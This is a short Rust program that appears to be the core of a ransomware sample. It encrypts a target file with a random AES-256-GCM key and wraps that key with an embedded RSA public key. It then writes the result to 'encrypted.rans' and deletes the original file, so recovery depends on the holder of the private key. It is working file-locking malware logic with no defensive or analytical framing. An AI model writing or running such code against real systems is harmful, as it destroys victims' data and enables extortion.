use rsa::{Oaep,  RsaPublicKey, pkcs8::DecodePublicKey, sha2::Sha256};
use aes_gcm::{AeadCore, Aes256Gcm, Key, aead::{Aead, KeyInit, OsRng}};
use rand::RngCore;
use std::{env, fs};
const  PINNED_PUBLIC_KEY_PEM: &str = include_str!("public_key.pem");
fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    let file_path = &args[1];
    let file_data = fs::read(file_path)?;

    let mut nonce_bytes = [0u8; 12];
    let mut aes_key_bytes = [0u8; 32];
    let mut rng = rand::thread_rng();
    rng.fill_bytes(&mut nonce_bytes);
    rng.fill_bytes(&mut aes_key_bytes);
    let aes_key = Key::<Aes256Gcm>::from_slice(&aes_key_bytes);
    let cipher = Aes256Gcm::new(aes_key);
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    let encrypted_data = cipher.encrypt(&nonce, file_data.as_ref()).map_err(|e| e.to_string())?;
    let pubkey = RsaPublicKey::from_public_key_pem(PINNED_PUBLIC_KEY_PEM)?;
    let encrypted_aes_key = pubkey.encrypt(&mut rng, Oaep::new::<Sha256>(), &aes_key)?;
    let mut output = Vec::new();
    output.extend_from_slice(&nonce);
    output.extend_from_slice(&encrypted_aes_key);
    output.extend_from_slice(&encrypted_data);
    fs::write("encrypted.rans", &output)?;
    fs::remove_file(file_path)?;
    println!("File encrypted successfully and saved as 'encrypted.rans'");
    Ok(())
}